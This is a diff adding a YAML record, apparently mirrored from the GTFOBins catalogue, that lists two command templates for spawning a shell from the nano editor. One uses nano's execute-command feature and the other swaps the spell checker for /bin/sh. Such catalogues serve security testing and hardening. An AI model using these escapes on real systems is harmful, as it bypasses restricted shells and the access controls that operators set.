@@ -1,0 +1,34 @@
+id: gtfobins/nano/shell/unprivileged
+type: binary
+platform: linux
+name: nano
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'nano
+
+    ^R^X
+
+    reset; sh 1>&0 2>&0'
+- template: 'nano -s /bin/sh
+
+    /bin/sh
+
+    ^T^T'
+  comment: The `SPELL` environment variable can be used in place of the `-s` option if the command line
+    cannot be changed.
+references:
+- https://gtfobins.github.io/gtfobins/nano/
+tags:
+- linux
+- unix
+- gtfobins
